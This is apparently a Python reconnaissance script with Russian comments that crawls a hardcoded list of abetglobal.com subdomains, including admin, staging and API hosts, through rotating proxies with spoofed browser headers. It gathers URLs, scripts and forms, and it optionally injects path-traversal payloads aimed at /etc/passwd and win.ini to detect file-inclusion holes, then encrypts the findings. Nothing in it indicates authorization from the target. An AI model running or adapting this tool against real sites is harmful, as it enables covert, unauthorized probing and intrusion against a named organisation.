#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Многопоточный паук-краулер для ABET Global через пул SOCKS/HTTP прокси с ротацией.
Разведка: GET-запросы, сбор URL/JS/форм/robots + LFI-проверка параметров (полуактивная).
Флаги: --lfi (LFI-тест), --kirpich (age-шифрование результатов, ключ проекта).
Без эксплуатации: только чтение и полуактивные GET-запросы через прокси."""
import re
import sys
import os
import time
import json
import urllib3
import requests
import subprocess
import concurrent.futures as cf

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FLAG_LFI = "--lfi" in sys.argv
FLAG_KIRPICH = "--kirpich" in sys.argv

LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
LFI_PAYLOADS = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "....//....//....//etc/passwd",
)
LFI_INDICATORS = ("root:", "daemon:", "win.ini", "[fonts]", "[extensions]", "boot.ini", "nobody:", "syntax error", "failed to open stream")

HOSTS = sys.argv[1].split(",") if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else [
    "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
    "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
    "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
    "forum.abetglobal.com", "api.abetglobal.com", "cmsapi.abetglobal.com",
    "crypto.abetglobal.com", "testmt5.abetglobal.com", "applicationapi.abetglobal.com",
]

PROXIES = [
    {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
    {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
]

def _fresh_proxies():
    """Свежие SOCKS5 из пула (ротатор уже перебирает мёртвых), до 8 штук."""
    try:
        with open("/root/office/container/pool/output/socks5_pool.json") as f:
            data = json.load(f)
        out = []
        for p in data.get("proxies", []):
            if p.get("alive") and p.get("proto") == "socks5" and ":" in p.get("proxy", ""):
                out.append({"http": "socks5h://" + p["proxy"], "https": "socks5h://" + p["proxy"]})
            if len(out) >= 8:
                break
        return out
    except Exception:
        return []

def _refresh_proxies():
    global PROXIES
    fresh = _fresh_proxies()
    if fresh:
        base = [
            {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
            {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
        ]
        PROXIES = base + fresh
        print(f"[spider] пул прокси обновлён: {len(PROXIES)} (ротатор + {len(fresh)} свежих)", flush=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
MAX_WORKERS = 16
DEPTH = 2
MAX_URLS_PER_HOST = 120
TIMEOUT = 12
_pi = 0
_lock = __import__("threading").Lock()

def next_proxy():
    global _pi
    with _lock:
        p = PROXIES[_pi % len(PROXIES)]
        _pi += 1
        return p

RE_LINKS = re.compile(r'(?:href|src|action|data-url|data-href)=["\']([^"\']+)["\']', re.I)
RE_JS = re.compile(r'\.js(?:\?[^"\'\s)]*)?', re.I)

def norm(base, u):
    if not u or u.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
        return None
    if u.startswith('//'):
        u = 'https:' + u
    u = requests.compat.urljoin(base, u)
    if u.startswith('http') and not u.startswith('https'):
        u = 'https' + u[4:]
    return u

def is_same_host(u, host):
    try:
        from urllib.parse import urlparse
        return urlparse(u).netloc == host or urlparse(u).netloc.endswith('.' + host)
    except Exception:
        return False

def fetch(url, host):
    """GET с ротацией прокси и failover (до 3 прокси на запрос). Возвращает (status, content_type, body) или (0, None, None)."""
    for _try in range(3):
        proxy = next_proxy()
        try:
            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site",
                "Cache-Control": "no-cache"}, verify=False, timeout=TIMEOUT,
                allow_redirects=True)
            if r.status_code and r.status_code < 400:
                return (r.status_code, (r.headers.get('Content-Type') or '').lower(), r.text)
            # 4xx/5xx — пробуем следующий прокси (сайт может блочить этот IP)
            continue
        except Exception:
            continue
    return (0, None, None)

def crawl_host(host):
    base = f"https://{host}/"
    seen, to_visit = set(), [base]
    found = {"urls": set(), "js": set(), "forms": [], "robots": [], "sitemap": [], "errors": []}
    depth_map = {base: 0}
    for _ in range(MAX_URLS_PER_HOST):
        if not to_visit:
            break
        url = to_visit.pop(0)
        if url in seen:
            continue
        seen.add(url)
        d = depth_map.get(url, 0)
        st, ct, body = fetch(url, host)
        found["urls"].add(f"{st}\t{url}")
        if st == 0:
            found["errors"].append(url)
            continue
        if not body:
            continue
        # robots.txt / sitemap
        if url.rstrip('/').endswith('/robots.txt'):
            for line in body.splitlines():
                if line.strip().startswith(('Disallow', 'Allow')):
                    found["robots"].append(line.strip())
                    p = line.split(':', 1)[1].strip() if ':' in line else None
                    if p and p != '/':
                        pu = norm(base, p)
                        if pu and is_same_host(pu, host) and pu not in seen:
                            to_visit.append(pu); depth_map[pu] = d + 1
        if 'sitemap' in url:
            for m in re.findall(r'<loc>\s*([^<]+?)\s*</loc>', body, re.I):
                found["sitemap"].append(m)
        # формы
        for fm in re.findall(r'<form[^>]*>(.*?)</form>', body, re.I | re.S):
            action = re.search(r'action=["\']([^"\']*)', fm, re.I)
            method = re.search(r'method=["\']([^"\']*)', fm, re.I)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', fm, re.I) + \
                     re.findall(r'<select[^>]*name=["\']([^"\']+)["\']', fm, re.I)
            found["forms"].append({"page": url, "action": action.group(1) if action else "",
                                   "method": (method.group(1) if method else "get").upper(),
                                   "inputs": list(dict.fromkeys(inputs))})
        # ссылки
        for m in RE_LINKS.findall(body):
            u = norm(url, m)
            if not u or not is_same_host(u, host):
                continue
            if RE_JS.search(u) and u.lower().endswith('.js'):
                found["js"].add(u)
                continue
            if u not in seen and u not in to_visit and d < DEPTH:
                to_visit.append(u); depth_map[u] = d + 1
    return host, found

def lfi_check(host, url):
    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
    Возвращает список находок [(param, payload, code, indicator)]."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    for name, val in params:
        if name.lower() not in LFI_NAMES:
            continue
        for payload in LFI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                low = body.lower()
                for ind in LFI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits

def main():
    target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
    out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
    out_js = f"/root/office/output/{target_name}_spider_js.txt"
    out_forms = f"/root/office/output/{target_name}_spider_forms.txt"
    lfi_out = f"/root/office/output/{target_name}_lfi.txt"
    _refresh_proxies()
    all_urls, all_js, all_forms = set(), set(), []
    robots_all, sitemap_all, errs = {}, {}, {}
    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(crawl_host, h): h for h in HOSTS}
        for fu in cf.as_completed(futs):
            h = futs[fu]
            try:
                host, found = fu.result()
                all_urls.update(found["urls"])
                all_js.update(found["js"])
                all_forms.extend(found["forms"])
                robots_all[host] = found["robots"]
                sitemap_all[host] = found["sitemap"]
                errs[host] = found["errors"]
                print(f"[DONE] {host}: urls={len(found['urls'])} js={len(found['js'])} forms={len(found['forms'])} err={len(found['errors'])}", flush=True)
            except Exception as e:
                print(f"[FAIL] {h}: {e}", flush=True)
    with open(out_urls, "w") as f:
        f.write("\n".join(sorted(all_urls)) + "\n")
    with open(out_js, "w") as f:
        f.write("\n".join(sorted(all_js)) + "\n")
    with open(out_forms, "w") as f:
        for fm in all_forms:
            f.write(f"{fm['method']} {fm['page']} -> action={fm['action']} inputs={fm['inputs']}\n")
    # LFI-проход по всем собранным URL с параметрами
    lfi_hits = []
    cands = []
    if FLAG_LFI:
        print("\n=== LFI-ПРОВЕРКА (полуактивная, через прокси) ===", flush=True)
        candidates = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
        cands = list(dict.fromkeys(candidates))[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(lfi_check, "spider", u): u for u in cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        lfi_hits.append((u, *h))
                        print(f"[LFI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    with open(lfi_out, "w") as f:
        f.write(f"# LFI-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(cands) if FLAG_LFI else 0}\n")
        for hit in lfi_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # Кирпич: шифрование результатов age-ключом проекта
    if FLAG_KIRPICH:
        for f_ in (out_urls, out_js, out_forms, lfi_out):
            if os.path.exists(f_):
                try:
                    subprocess.run(["kirpich-encrypt.sh", f_], check=True, capture_output=True)
                    print(f"[KIRPICH] зашифровано: {f_}.age", flush=True)
                except Exception as e:
                    print(f"[KIRPICH] не удалось ({f_}): {e}", flush=True)
    print("\n=== ИТОГО ===")
    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)}")
    print("\n--- ROBOTS ---")
    for h, r in robots_all.items():
        if r:
            print(h, "->", "; ".join(r))
    print("\n--- SITEMAP (loc) ---")
    for h, s in sitemap_all.items():
        if s:
            print(h, "->", "; ".join(s[:30]))
    print("\n--- ERRORS (недоступно) ---")
    for h, e in errs.items():
        if e:
            print(h, "->", len(e))

if __name__ == "__main__":
    main()
